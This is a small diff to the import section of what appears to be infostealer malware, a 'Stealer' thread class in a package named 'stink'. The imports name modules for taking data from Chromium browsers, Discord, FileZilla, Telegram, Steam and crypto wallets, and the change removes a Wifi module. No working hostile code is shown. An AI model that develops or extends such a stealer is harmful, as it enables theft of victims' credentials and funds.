@@ -8,7 +8,7 @@ from stink.enums import Features, Utils
 from stink.utils import Autostart, Message
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
-from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets, Wifi
+from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
 
 
 class Stealer(Thread):
